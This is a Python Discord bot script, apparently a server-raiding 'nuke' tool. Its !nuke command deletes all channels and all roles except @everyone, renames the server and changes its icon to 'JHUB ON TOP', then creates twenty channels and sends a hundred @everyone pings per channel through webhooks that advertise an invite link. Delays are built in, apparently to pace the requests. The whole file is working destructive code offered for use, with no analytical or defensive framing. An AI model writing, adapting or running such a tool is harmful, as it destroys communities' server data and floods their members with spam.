import discord
from discord.ext import commands
import os
import aiohttp
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
channels_to_create = 20
pings_per_channel = 100

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting NUKE sequence...")

    # Delete all channels sequentially with delay
    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    # Delete all roles except @everyone sequentially with delay
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

    # Rename server and change icon
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(guild_icon) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await guild.edit(name=guild_name, icon=icon_data)
    except Exception as e:
        print(f"❌ Failed to change server name/icon: {e}")

    # Create channels and spam sequentially with delays
    for i in range(channels_to_create):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i}")
            await asyncio.sleep(0.3)  # Delay before webhook creation
            webhook = await channel.create_webhook(name=webhook_name)
            for _ in range(pings_per_channel):
                try:
                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                    await asyncio.sleep(0.2)  # Delay between pings
                except Exception as e:
                    print(f"❌ Webhook send failed in channel {channel.name}: {e}")
        except Exception as e:
            print(f"❌ Failed to create/spam channel {i}: {e}")

    print("✅ NUKE complete.")

if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
